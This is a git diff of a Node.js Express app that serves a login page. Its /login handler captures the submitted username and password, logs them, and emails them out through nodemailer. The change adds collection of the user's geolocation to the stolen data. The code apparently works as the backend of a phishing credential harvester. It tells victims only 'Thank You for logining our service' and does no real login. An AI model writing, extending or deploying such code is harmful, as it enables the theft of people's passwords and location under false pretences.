@@ -5,7 +5,7 @@ app.set("view engine","ejs");
 app.use(bodyParser.urlencoded({
 	extended : true
 }))
-// Starting to send gmail
+//	Connecting nodemailer
 const nodemailer = require('nodemailer');
 
 //step 1
@@ -16,42 +16,36 @@ let transporter = nodemailer.createTransport({
 		pass : '' //password
 	}
 });
-
-var loginName;
-var password;
+var loginName,
+	password,
+	geovalue;
 app.post("/login",function(req,res) {
 	loginName = req.body.login;
 	password = req.body.password;
+	geovalue = req.body.geolocation;
 	res.send("Thank You for logining our service");
-	console.log("login: " + loginName)
-	console.log("password: " + password)
+	console.log("login: " + loginName);
+	console.log("password: " + password);
+	console.log(geovalue);
 //step 2
 let mailOptions = {
 	from : '', // email
 	to : '', // email
 	subject : "Main information", //subject
-	text : "login: " + loginName + ", password : " + password //text 
+	text : `Login:  ${loginName};  Password :  ${password};   ${geovalue}`//text 
 };
-	
 //step 3
 transporter.sendMail(mailOptions,function (err,data) {
-	if (err) {
-		console.log('ERROR: ' + err);
-	}else {
-		console.log('we made it mail was sent');
-	}
-}) 
+		if (err) {
+			console.log('ERROR: ' + err);
+		}else {
+			console.log('we made it mail was sent');
+		}
+	}) 
 })
-
-
-
 app.get("/",function(req,res){
 	res.render("login");
 });
-
 app.listen(3000,function(){
 	console.log('started');
 });
-
-
-
